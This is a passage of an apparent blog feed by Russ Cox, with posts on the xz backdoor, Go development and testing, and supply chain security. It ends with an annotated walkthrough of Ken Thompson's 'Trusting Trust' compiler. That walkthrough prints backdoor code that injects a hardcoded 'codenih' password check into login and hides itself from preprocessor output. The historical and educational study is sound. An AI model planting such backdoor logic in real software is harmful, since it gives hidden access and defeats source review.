(2024-04-01)&#xA;&lt;li&gt;&#xA;Kevin Beaumont, &lt;a href=&#34;https://doublepulsar.com/inside-the-failed-attempt-to-backdoor-ssh-globally-that-got-caught-by-chance-bbfe628fafdd&#34;&gt;Inside the failed attempt to backdoor SSH globally — that got caught by chance&lt;/a&gt; (2024-03-31)&#xA;&lt;li&gt;&#xA;amlweems, &lt;a href=&#34;https://github.com/amlweems/xzbot&#34;&gt;xzbot: notes, honeypot, and exploit demo for the xz backdoor&lt;/a&gt; (2024-04-01)&#xA;&lt;li&gt;&#xA;Rhea Karty and Simon Henniger, &lt;a href=&#34;https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and&#34;&gt;XZ Backdoor: Times, damned times, and scams&lt;/a&gt; (2024-03-30)&#xA;&lt;li&gt;&#xA;Andy Greenberg and Matt Burgess, &lt;a href=&#34;https://www.wired.com/story/jia-tan-xz-backdoor/&#34;&gt;The Mystery of ‘Jia Tan,’ the XZ Backdoor Mastermind&lt;/a&gt; (2024-04-03)&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://risky.biz/RB743/&#34;&gt;Risky Business #743 -- A chat about the xz backdoor with the guy who found it&lt;/a&gt; (2024-04-03)&lt;/ul&gt;&#xA;&#xA;</content>
  </entry>
  <entry>
    <title>Go Changes</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/gochanges</id>
    <link rel="alternate" href="http://research.swtch.com/gochanges"></link>
    <published>2023-12-08T12:00:00-05:00</published>
    <updated>2023-12-08T12:02:00-05:00</updated>
    <summary type="text">The way Go changes, and how to improve it with telemetry.</summary>
    <content type="html">&#xA;&#xA;&lt;p&gt;&#xA;I opened GopherCon (USA) in October with the talk “Go Changes”,&#xA;which looked at how Go evolves, the importance of data in making shared decisions,&#xA;and why opt-in telemetry in the Go toolchain&#xA;is a useful, effective, and appropriate new source of data.&#xA;&#xA;&lt;p&gt;&#xA;I re-recorded it at home and have posted it here:&#xA;&lt;div style=&#34;border: 1px solid black; margin: auto; margin-top: 1em; margin-bottom: 1em; width:560px; height:315px;&#34;&gt;&#xA;&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube-nocookie.com/embed/BNmxtp26I5s?si=3ZpIWEA72ehzJrVO&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; allowfullscreen&gt;&lt;/iframe&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Links:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://go.dev/s/proposal&#34;&gt;The Go Proposal Process&lt;/a&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;sample&#34;&gt;The Magic of Sampling&lt;/a&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;telemetry&#34;&gt;Go Telemetry Blog Posts&lt;/a&gt;&lt;/ul&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Errata:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;There is a mistake in the probability discussion: (2/3)&lt;sup&gt;100&lt;/sup&gt; is about 2.46×10&lt;sup&gt;–18&lt;/sup&gt;, not 1.94×10&lt;sup&gt;–48&lt;/sup&gt;. The latter is (1/3)&lt;sup&gt;100&lt;/sup&gt;. The probability of pulling 100 gophers without getting the third color remains vanishingly small. Apologies for the mistake.&lt;/ul&gt;&#xA;&#xA;</content>
  </entry>
  <entry>
    <title>Go Testing By Example</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/testing</id>
    <link rel="alternate" href="http://research.swtch.com/testing"></link>
    <published>2023-12-05T08:00:00-05:00</published>
    <updated>2023-12-05T08:02:00-05:00</updated>
    <summary type="text">The importance of testing, and twenty tips for writing good tests.</summary>
    <content type="html">&#xA;&#xA;&lt;p&gt;&#xA;I opened GopherCon Australia in early November with the talk “Go Testing By Example”.&#xA;Being the first talk, there were some A/V issues, so I re-recorded it at home and have posted it here:&#xA;&lt;div style=&#34;border: 1px solid black; margin: auto; margin-top: 1em; margin-bottom: 1em; width:560px; height:315px;&#34;&gt;&#xA;&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube-nocookie.com/embed/X4rxi9jStLo?si=DJiEGUPNxPlYnlWL&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; allowfullscreen&gt;&lt;/iframe&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Here are the 20 tips from the talk:&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;Make it easy to add new test cases.&#xA;&lt;li&gt;&#xA;Use test coverage to find untested code.&#xA;&lt;li&gt;&#xA;Coverage is no substitute for thought.&#xA;&lt;li&gt;&#xA;Write exhaustive tests.&#xA;&lt;li&gt;&#xA;Separate test cases from test logic.&#xA;&lt;li&gt;&#xA;Look for special cases.&#xA;&lt;li&gt;&#xA;If you didn’t add a test, you didn’t fix the bug.&#xA;&lt;li&gt;&#xA;Not everything fits in a table.&#xA;&lt;li&gt;&#xA;Test cases can be in testdata files.&#xA;&lt;li&gt;&#xA;Compare against other implementations.&#xA;&lt;li&gt;&#xA;Make test failures readable.&#xA;&lt;li&gt;&#xA;If the answer can change, write code to update them.&#xA;&lt;li&gt;&#xA;Use &lt;a href=&#34;https://pkg.go.dev/golang.org/x/tools/txtar&#34;&gt;txtar&lt;/a&gt; for multi-file test cases.&#xA;&lt;li&gt;&#xA;Annotate existing formats to create testing mini-languages.&#xA;&lt;li&gt;&#xA;Write parsers and printers to simplify tests.&#xA;&lt;li&gt;&#xA;Code quality is limited by test quality.&#xA;&lt;li&gt;&#xA;Scripts make good tests.&#xA;&lt;li&gt;&#xA;Try &lt;a href=&#34;https://pkg.go.dev/rsc.io/script&#34;&gt;rsc.io/script&lt;/a&gt; for your own script-based test cases.&#xA;&lt;li&gt;&#xA;Improve your tests over time.&#xA;&lt;li&gt;&#xA;Aim for continuous deployment.&lt;/ol&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Enjoy!&#xA;</content>
  </entry>
  <entry>
    <title>Open Source Supply Chain Security at Google</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/acmscored</id>
    <link rel="alternate" href="http://research.swtch.com/acmscored"></link>
    <published>2023-11-30T04:10:00-05:00</published>
    <updated>2023-11-30T04:12:00-05:00</updated>
    <summary type="text">A remote talk at ACM SCORED 2023</summary>
    <content type="html">&#xA;&#xA;&lt;p&gt;&#xA;I was a remote opening keynote speaker at &lt;a href=&#34;https://scored.dev/&#34;&gt;ACM SCORED 2023&lt;/a&gt;, which we decided meant that I sent a video to play and I was on Discord during the talk for attendees to text directly with question as the video played, and then we did some live but still remote Q&amp;amp;A after the talk.&#xA;&#xA;&lt;p&gt;&#xA;My talk was titled “Open Source Supply Chain Security at Google” and was 45 minutes long. I spent a while at the start defining open source supply chain security and a while at the end on comparisons with the 1970s. In between, I talked about various supply chain-related efforts at Google. All the Google efforts mentioned in the talk have been publicly discussed elsewhere and are linked below.&#xA;&lt;div style=&#34;border: 1px solid black; margin: auto; margin-top: 1em; margin-bottom: 1em; width:560px; height:315px;&#34;&gt;&#xA;&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube-nocookie.com/embed/6H-V-0oQvCA?si=mprcItvmNMw5QnR0&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; allowfullscreen&gt;&lt;/iframe&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Here are the &lt;a href=&#34;https://youtu.be/6H-V-0oQvCA&#34;&gt;talk video&lt;/a&gt; and &lt;a href=&#34;acmscored.pdf&#34;&gt;talk slides&lt;/a&gt;.  Opinions expressed in the talk about languages and the last half century of supply chain security are mine, not Google’s.&#xA;&#xA;&lt;p&gt;&#xA;References or acknowledgements for the slides:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;Crypto AG: &lt;a href=&#34;https://www.theguardian.com/us-news/2020/feb/11/crypto-ag-cia-bnd-germany-intelligence-report&#34;&gt;Guardian&lt;/a&gt; and &lt;a href=&#34;https://www.washingtonpost.com/graphics/2020/world/national-security/cia-crypto-encryption-machines-espionage/&#34;&gt;Washington Post&lt;/a&gt;&#xA;&lt;li&gt;&#xA;Enigma photograph: personal photo, taken at Bletchley Park in 2012&#xA;&lt;li&gt;&#xA;XcodeGhost: &lt;a href=&#34;https://unit42.paloaltonetworks.com/novel-malware-xcodeghost-modifies-xcode-infects-apple-ios-apps-and-hits-app-store/&#34;&gt;Palo Alto Networks&lt;/a&gt;&#xA;&lt;li&gt;&#xA;Juniper Attack: &lt;a href=&#34;https://cacm.acm.org/magazines/2018/11/232227-where-did-i-leave-my-keys/fulltext&#34;&gt;CACM&lt;/a&gt;, &lt;a href=&#34;https://eprint.iacr.org/2016/376.pdf&#34;&gt;Eprint&lt;/a&gt;, &lt;a href=&#34;https://www.bloomberg.com/news/features/2021-09-02/juniper-mystery-attacks-traced-to-pentagon-role-and-chinese-hackers&#34;&gt;Bloomberg&lt;/a&gt;&#xA;&lt;li&gt;&#xA;SolarWinds: &lt;a href=&#34;https://www.wired.com/story/the-untold-story-of-solarwinds-the-boldest-supply-chain-hack-ever/&#34;&gt;Wired (Kim Zetter)&lt;/a&gt;&#xA;&lt;li&gt;&#xA;NPM event-stream: &lt;a href=&#34;https://arstechnica.com/information-technology/2018/11/hacker-backdoors-widely-used-open-source-software-to-steal-bitcoin/&#34;&gt;Ars Technica&lt;/a&gt;, &lt;a href=&#34;https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident&#34;&gt;NPM&lt;/a&gt;&#xA;&lt;li&gt;&#xA;iMessage JBIG2: &lt;a href=&#34;https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html&#34;&gt;Project Zero&lt;/a&gt;&#xA;&lt;li&gt;&#xA;Log4j: &lt;a href=&#34;https://www.minecraft.net/en-us/article/important-message--security-vulnerability-java-edition&#34;&gt;Minecraft&lt;/a&gt;, &lt;a href=&#34;https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance&#34;&gt;CISA&lt;/a&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://deps.dev/go/k8s.io%2Fkubernetes/v1.28.4/dependencies/graph&#34;&gt;Kubernetes on Open Source Insights&lt;/a&gt; and &lt;a href=&#34;https://deps.dev/go/k8s.io%2Fkubernetes/v1.28.4/compare?v2=v1.29.0-rc.0&#34;&gt;comparing versions&lt;/a&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://www.sigstore.dev/&#34;&gt;Sigstore&lt;/a&gt;&#xA;&lt;li&gt;&#xA;“&lt;a href=&#34;https://go.dev/blog/rebuild&#34;&gt;Perfectly Reproducible, Verified Go Toolchains&lt;/a&gt;”&#xA;&lt;li&gt;&#xA;“&lt;a href=&#34;https://go.dev/blog/supply-chain&#34;&gt;How Go Mitigates Supply Chain Attacks&lt;/a&gt;”&#xA;&lt;li&gt;&#xA;Two-person photograph: &lt;a href=&#34;https://www.nationalmuseum.af.mil/Visit/Museum-Exhibits/Fact-Sheets/Display/Article/197675/launching-missiles/&#34;&gt;Air Force National Museum&lt;/a&gt;, public domain&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://slsa.dev/spec/v1.0/levels&#34;&gt;SLSA (Supply-chain Levels for Software Artifacts)&lt;/a&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://securityscorecards.dev/&#34;&gt;Security Scorecards&lt;/a&gt;&#xA;&lt;li&gt;&#xA;Capslock: &lt;a href=&#34;https://security.googleblog.com/2023/09/capslock-what-is-your-code-really.html&#34;&gt;blog post&lt;/a&gt;, &lt;a href=&#34;https://github.com/google/capslock&#34;&gt;repository&lt;/a&gt;&#xA;&lt;li&gt;&#xA;Google &lt;a href=&#34;https://bughunters.google.com/open-source-security&#34;&gt;Open Source Security Rewards&lt;/a&gt;&#xA;&lt;li&gt;&#xA;Google Project Zero: &lt;a href=&#34;https://security.googleblog.com/2014/07/announcing-project-zero.html&#34;&gt;blog post&lt;/a&gt;, &lt;a href=&#34;https://www.youtube.com/watch?v=My_13FXODdU&#34;&gt;excellent video&lt;/a&gt;&#xA;&lt;li&gt;&#xA;OSS-Fuzz: &lt;a href=&#34;https://opensource.googleblog.com/2016/12/announcing-oss-fuzz-continuous-fuzzing.html&#34;&gt;blog post&lt;/a&gt;, &lt;a href=&#34;https://github.com/google/oss-fuzz&#34;&gt;repository&lt;/a&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://syzkaller.appspot.com/upstream&#34;&gt;Syzkaller dashboard&lt;/a&gt;&#xA;&lt;li&gt;&#xA;Internet worm: &lt;a href=&#34;https://timesmachine.nytimes.com/timesmachine/1988/11/04/issue.html&#34;&gt;New York Times&lt;/a&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://media.defense.gov/2022/Nov/10/2003112742/-1/-1/0/CSI_SOFTWARE_MEMORY_SAFETY.PDF&#34;&gt;NSA Software Memory Safety&lt;/a&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://go.dev/&#34;&gt;Go home page&lt;/a&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://www.rust-lang.org/&#34;&gt;Rust home page&lt;/a&gt;&#xA;&lt;li&gt;&#xA;SBOMs: “&lt;a href=&#34;https://www.ntia.gov/sites/default/files/publications/ntia_sbom_framing_2nd_edition_20211021_0.pdf&#34;&gt;NTIA: Framing Software Component Transparency&lt;/a&gt;”, “&lt;a href=&#34;https://www.cisa.gov/sites/default/files/2023-10/Software-Identification-Ecosystem-Option-Analysis-508c.pdf&#34;&gt;CISA: Software Identification Ecosystem Option Analysis&lt;/a&gt;”&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://osv.dev&#34;&gt;Open Source Vulnerability&lt;/a&gt; database&#xA;&lt;li&gt;&#xA;Govulncheck: &lt;a href=&#34;https://go.dev/blog/govulncheck&#34;&gt;blog post&lt;/a&gt;, &lt;a href=&#34;https://pkg.go.dev/golang.org/x/vuln/cmd/govulncheck&#34;&gt;package docs&lt;/a&gt;, &lt;a href=&#34;https://go.dev/doc/tutorial/govulncheck&#34;&gt;tutorial&lt;/a&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://cloud.google.com/artifact-registry/docs/analysis&#34;&gt;Google Cloud Artifact Analysis&lt;/a&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://seclab.cs.ucdavis.edu/projects/history/papers/karg74.pdf&#34;&gt;Air Force Review of Multics&lt;/a&gt; (quotes are from pages numbered 51 and 52 on the paper, aka PDF pages 55 and 56)&#xA;&lt;li&gt;&#xA;Thompson backdoor: “&lt;a href=&#34;https://dl.acm.org/doi/10.1145/358198.358210&#34;&gt;Reflections on Trusting Trust&lt;/a&gt;” (1983) and &lt;a href=&#34;https://research.swtch.com/nih&#34;&gt;annotated code&lt;/a&gt; (2023)&lt;/ul&gt;&#xA;&#xA;</content>
  </entry>
  <entry>
    <title>Running the “Reflections on Trusting Trust” Compiler</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/nih</id>
    <link rel="alternate" href="http://research.swtch.com/nih"></link>
    <published>2023-10-25T21:00:00-04:00</published>
    <updated>2023-10-25T21:00:00-04:00</updated>
    <summary type="text">Ken Thompson’s Turing award lecture, running in your browser.</summary>
    <content type="html">&#xA;&lt;style&gt;&#xA;body { font-family: &#39;Minion 3&#39;; }&#xA;.nih pre { padding-top: 0.2em; margin: 0; }&#xA;.nih { border-spacing: 0; }&#xA;.nih tr { padding: 0; }&#xA;.nih td { padding: 0.5em; min-width: 25em; }&#xA;.nih td { vertical-align: top; }&#xA;.nih td.l { font-style: italic; }&#xA;.nih td.r { background-color: #eee; }&#xA;.nih td p { text-align: right; clear: both; margin-block-start: 0; margin-block-end: 0; }&#xA;.nih td div { float: right; }&#xA;.string { color: #700; }&#xA;.del { color: #aaa; }&#xA;.ins { font-weight: bold; }&#xA;&lt;/style&gt;&#xA;&#xA;&lt;p&gt;&#xA;Supply chain security is a hot topic today, but it is a very old problem.&#xA;In October 1983, 40 years ago this week,&#xA;Ken Thompson chose supply chain security as the topic for his Turing award lecture,&#xA;although the specific term wasn’t used back then.&#xA;(The field of computer science was still young and small enough that the ACM conference where Ken spoke was&#xA;the “Annual Conference on Computers.”)&#xA;Ken’s lecture was later published in &lt;i&gt;Communications of the ACM&lt;/i&gt;&#xA;under the title “&lt;a href=&#34;https://dl.acm.org/doi/pdf/10.1145/358198.358210&#34;&gt;Reflections on Trusting Trust&lt;/a&gt;.”&#xA;It is a classic paper, and a short one (3 pages);&#xA;if you haven’t read it yet, you should. This post will still be here when you get back.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&#xA;In the lecture, Ken explains in three steps how to modify a C compiler binary&#xA;to insert a backdoor when compiling the “login” program,&#xA;leaving no trace in the source code.&#xA;In this post, we will run the backdoored compiler using Ken’s actual code.&#xA;But first, a brief summary of the important parts of the lecture.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;a class=anchor href=&#34;#step1&#34;&gt;&lt;h2 id=&#34;step1&#34;&gt;Step 1: Write a Self-Reproducing Program&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;&#xA;Step 1 is to write a program that prints its own source code.&#xA;Although the technique was not widely known in 1975,&#xA;such a program is now known in computing as a “&lt;a href=&#34;https://en.wikipedia.org/wiki/Quine_(computing)&#34;&gt;quine&lt;/a&gt;,”&#xA;popularized by Douglas Hofstadter in &lt;i&gt;Gödel, Escher, Bach&lt;/i&gt;.&#xA;Here is a Python quine, from &lt;a href=&#34;https://cs.lmu.edu/~ray/notes/quineprograms/&#34;&gt;this collection&lt;/a&gt;:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre&gt;&#xA;s=&lt;span class=&#34;string&#34;&gt;’s=%r;print(s%%s)’&lt;/span&gt;;print(s%s)&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;&#xA;And here is a slightly less cryptic Go quine:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre&gt;&#xA;package main&#xA;func main() { print(q + &#34;\x60&#34; + q + &#34;\x60&#34;) }&#xA;var q = &lt;span class=string&gt;`package main&#xA;func main() { print(q + &#34;\x60&#34; + q + &#34;\x60&#34;) }&#xA;var q = `&lt;/span&gt;&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;The general idea of the solution is to put the text of the program into a string literal, with some kind of placeholder where the string itself should be repeated. Then the program prints the string literal, substituting that same literal for the placeholder.&#xA;In the Python version, the placeholder is &lt;code&gt;%r&lt;/code&gt;;&#xA;in the Go version, the placeholder is implicit at the end of the string.&#xA;For more examples and explanation, see my post “&lt;a href=&#34;zip&#34;&gt;Zip Files All The Way Down&lt;/a&gt;,” which uses a Lempel-Ziv quine to construct a zip file that contains itself.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;a class=anchor href=&#34;#step2&#34;&gt;&lt;h2 id=&#34;step2&#34;&gt;Step 2: Compilers Learn&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;&#xA;Step 2 is to notice that when a compiler compiles itself,&#xA;there can be important details that persist only in the compiler&#xA;binary, not in the actual source code.&#xA;Ken gives the example of the numeric values of escape sequences in C strings.&#xA;You can imagine a compiler containing code like this during&#xA;the processing of escaped string literals:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre&gt;&#xA;c = next();&#xA;if(c == &#39;\\&#39;) {&#xA;    c = next();&#xA;    if(c == &#39;n&#39;)&#xA;        c = &#39;\n&#39;;&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;&#xA;That code is responsible for processing the two character sequence &lt;code&gt;\n&lt;/code&gt;&#xA;in a string literal&#xA;and turning it into a corresponding byte value,&#xA;specifically &lt;code&gt;’\n’&lt;/code&gt;.&#xA;But that’s a circular definition, and the first time you write code like that it won’t compile.&#xA;So instead you write &lt;code&gt;c = 10&lt;/code&gt;,&#xA;you compile and install the compiler, and &lt;i&gt;then&lt;/i&gt; you can change&#xA;the code to &lt;code&gt;c = ’\n’&lt;/code&gt;.&#xA;The compiler has “learned” the value of &lt;code&gt;’\n’&lt;/code&gt;,&#xA;but that value only appears in the compiler binary,&#xA;not in the source code.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;a class=anchor href=&#34;#step3&#34;&gt;&lt;h2 id=&#34;step3&#34;&gt;Step 3: Learn a Backdoor&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;&#xA;Step 3 is to put these together to help the compiler “learn”&#xA;to miscompile the target program (&lt;code&gt;login&lt;/code&gt; in the lecture).&#xA;It is fairly straightforward to write code in a compiler&#xA;to recognize a particular input program and modify its code,&#xA;but that code would be easy to find if the compiler source were inspected.&#xA;Instead, we can go deeper, making two changes to the compiler:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Recognize &lt;code&gt;login&lt;/code&gt; and insert the backdoor.&#xA;&lt;li&gt;Recognize the compiler itself and insert the code for these two changes.&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;p&gt;&#xA;The “insert the code for these two changes” step requires being able to write&#xA;a self-reproducing program: the code must reproduce itself&#xA;into the new compiler binary.&#xA;At this point, the compiler binary has “learned” the miscompilation steps,&#xA;and the clean source code can be restored.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;a class=anchor href=&#34;#run&#34;&gt;&lt;h2 id=&#34;run&#34;&gt;Running the Code&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;At the Southern California Linux Expo in March 2023,&#xA;Ken gave the closing keynote,&#xA;&lt;a href=&#34;https://www.youtube.com/live/kaandEt_pKw?si=RGKrC8c0B9_AdQ9I&amp;t=643&#34;&gt;a delightful talk&lt;/a&gt;&#xA;about his 75-year effort accumulating what must be the world’s&#xA;largest privately held digital music collection,&#xA;complete with actual jukeboxes and a player piano (video opens at 10m43s, when his talk begins).&#xA;During the Q&amp;A session, someone &lt;a href=&#34;https://www.youtube.com/live/kaandEt_pKw?si=koOlE35Q3mjqH4yf&amp;t=3284&#34;&gt;jokingly asked&lt;/a&gt; about the Turing award lecture, specifically&#xA;“can you tell us right now whether you have a backdoor into every copy of gcc and Linux still today?”&#xA;Ken replied:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;I assume you’re talking about some paper I wrote a long time ago.&#xA;No, I have no backdoor.&#xA;That was very carefully controlled, because there were some spectacular fumbles before that.&#xA;I got it released, or I got somebody to steal it from me, in a very controlled sense,&#xA;and then tracked whether they found it or not.&#xA;And they didn’t.&#xA;But they broke it, because of some technical effect,&#xA;but they didn’t find out what it was and then track it.&#xA;So it never got out, if that’s what you’re talking about.&#xA;I hate to say this in front of a big audience, but&#xA;the one question I’ve been waiting for since I wrote that paper is&#xA;“you got the code?”&#xA;Never been asked.&#xA;I still have the code.&#xA;&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;Who could resist that invitation!?&#xA;Immediately after watching the video on YouTube in September 2023,&#xA;I emailed Ken and asked him for the code.&#xA;Despite my being six months late, he said I was the first person to ask&#xA;and mailed back an attachment called &lt;code&gt;nih.a&lt;/code&gt;,&#xA;a cryptic name for a cryptic program.&#xA;(Ken tells me it does in fact stand for “not invented here.”)&#xA;Normally today, &lt;code&gt;.a&lt;/code&gt; files are archives containing&#xA;compiler object files,&#xA;but this one contains two source files.&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&#xA;The code applies cleanly to the C compiler from the&#xA;&lt;a href=&#34;https://en.wikipedia.org/wiki/Research_Unix&#34;&gt;Research Unix Sixth Edition (V6)&lt;/a&gt;.&#xA;I’ve posted an online emulator that runs V6 Unix programs&#xA;and populated it with some old files from Ken and Dennis,&#xA;including &lt;code&gt;nih.a&lt;/code&gt;.&#xA;Let’s actually run the code.&#xA;You can &lt;a href=&#34;https://research.swtch.com/v6&#34;&gt;follow along in the simulator&lt;/a&gt;.&lt;/p&gt;&#xA;&#xA;&#xA;&lt;table class=&#34;nih&#34;&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Login as &lt;code&gt;ken&lt;/code&gt;, password &lt;code&gt;ken&lt;/code&gt;.&lt;br&gt;&#xA;(The password is normally not shown.)&#xA;&lt;td class=r&gt;&lt;pre&gt;login: &lt;b&gt;ken&lt;/b&gt;&#xA;Password: &lt;b&gt;ken&lt;/b&gt;&#xA;&#xA;% &lt;b&gt;who&lt;/b&gt;&#xA;ken     tty8 Aug 14 22:06&#xA;%&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Change to and list the &lt;code&gt;nih&lt;/code&gt; directory,&lt;br&gt;&#xA;discovering a Unix archive.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;% &lt;b&gt;chdir nih&lt;/b&gt;&#xA;% &lt;b&gt;ls&lt;/b&gt;&#xA;nih.a&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Extract &lt;code&gt;nih.a&lt;/code&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;% &lt;b&gt;ar xv nih.a&lt;/b&gt;&#xA;x x.c&#xA;x rc&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Let’s read &lt;code&gt;x.c&lt;/code&gt;, a C program.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;% &lt;b&gt;cat x.c&lt;/b&gt;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Declare the global variable &lt;code&gt;nihflg&lt;/code&gt;,&lt;br&gt;&#xA;of implied type &lt;code&gt;int&lt;/code&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;nihflg;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;&#xA;Define the function &lt;code&gt;codenih&lt;/code&gt;, with implied&lt;br&gt;&#xA;return type &lt;code&gt;int&lt;/code&gt; and no arguments.&lt;br&gt;&#xA;The compiler will be modified to call &lt;code&gt;codenih&lt;/code&gt;&lt;br&gt;&#xA;during preprocessing, for each input line.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;codenih()&#xA;{&#xA;    char *p,*s;&#xA;    int i;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;&lt;code&gt;cc -p&lt;/code&gt; prints the preprocessor output&lt;br&gt;&#xA;instead of invoking the compiler back end.&lt;br&gt;&#xA;To avoid discovery, do nothing when &lt;code&gt;-p&lt;/code&gt; is used.&lt;br&gt;&#xA;The implied return type of &lt;code&gt;codenih&lt;/code&gt; is &lt;code&gt;int&lt;/code&gt;,&lt;br&gt;&#xA;but early C allowed omitting the return value.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;    if(pflag)&#xA;        return;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Skip leading tabs in the line.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;    p=line;&#xA;    while(*p==&#39;\t&#39;)&#xA;        p++;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Look for the line&lt;br&gt;&#xA;“&lt;code&gt;name = crypt(pwbuf);&lt;/code&gt;” from &lt;a href=&#34;login.c#crypt&#34;&gt;&lt;code&gt;login.c&lt;/code&gt;&lt;/a&gt;.&lt;br&gt;&#xA;If not found, jump to &lt;code&gt;l1&lt;/code&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;    s=&#34;namep = crypt(pwbuf);&#34;;&#xA;    for(i=0;i&amp;lt;21;i++)&#xA;        if(s[i]!=p[i])&#xA;            goto l1;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Define &lt;code&gt;login&lt;/code&gt; backdoor code &lt;code&gt;s&lt;/code&gt;, which does:&lt;br&gt;&#xA;Check for the password “&lt;code&gt;codenih&lt;/code&gt;”.&lt;br&gt;&#xA;If found, modify &lt;code&gt;namep&lt;/code&gt; and &lt;code&gt;np&lt;/code&gt;&lt;br&gt;&#xA;so that the code that follows in &lt;br&gt;&#xA;&lt;a href=&#34;login.c#crypt&#34;&gt;&lt;code&gt;login.c&lt;/code&gt;&lt;/a&gt; will accept the password.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;    p=+i;&#xA;    s=&#34;for(c=0;c&amp;lt;8;c++)&#34;&#xA;      &#34;if(\&#34;codenih\&#34;[c]!=pwbuf[c])goto x1x;&#34;&#xA;      &#34;while(*namep)namep++;&#34;&#xA;      &#34;while(*np!=&#39;:&#39;)np++;x1x:&#34;;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;With the &lt;code&gt;p=+i&lt;/code&gt; from above,&lt;br&gt;&#xA;this is: 